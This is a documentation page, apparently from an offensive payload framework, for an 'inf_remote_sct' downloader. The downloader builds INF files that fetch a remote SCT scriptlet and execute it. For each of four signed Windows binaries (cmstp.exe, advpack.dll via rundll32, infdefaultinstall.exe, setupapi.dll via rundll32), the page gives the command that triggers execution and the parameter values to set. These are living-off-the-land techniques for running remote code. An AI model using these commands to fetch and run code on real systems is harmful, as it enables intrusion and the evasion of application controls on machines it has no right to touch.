+++
title = "inf_remote_sct"
chapter = false
weight = 100
+++

## inf_remote_sct

This is a "Downloader" payload type, meaning it will fetch the payload from a url.
It is NOT an wrapper payload

### Downloader
  
This downloader will download a remote SCT file and execute its content

Parameters:
- url: URL where the SCT payload is located
- defaultinstall_name: Name of the main section, to adapt depending on the LOLBAS used
- method: Method to execute the SCT, to adapt depending on the LOLBAS used  [UnRegisterOCXs, UnregisterDlls]
- section_name: Name of the section containing the SCT execution code
- service: Service name, adds a section if non-null. Used for cmstp.exe

## LOLBas details

### cmstp.exe

Exemple command

```
cmstp.exe /ni /s test.inf
``` 

Parameters to set:
- defaultinstall_name: DefaultInstall_SingleUser
- section_name: Anything, just set it !
- method: UnRegisterOCXs
- service: Anything, just set it ! 

### advpack.dll

Exemple command

```
rundll32.exe advpack.dll,LaunchINFSection test.inf,DefaultInstall
``` 

Parameters to set:
- defaultinstall_name: Same value as the command line "DefaultInstall"
- section_name: Anything, just set it !
- method: UnRegisterOCXs

### infdefaultinstall.exe

Exemple command

```
infdefaultinstall.exe C:\test.inf
``` 

Parameters to set:
- defaultinstall_name: DefaultInstall
- section_name: Anything, just set it !
- method: UnregisterDlls

### setupapi.dll

Exemple command

```
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\test.inf
``` 

Parameters to set:
- defaultinstall_name: Same value as the command line "DefaultInstall"
- section_name: Anything, just set it !
- method: UnregisterDlls


## Author

- [@hegusung](https://github.com/hegusung)
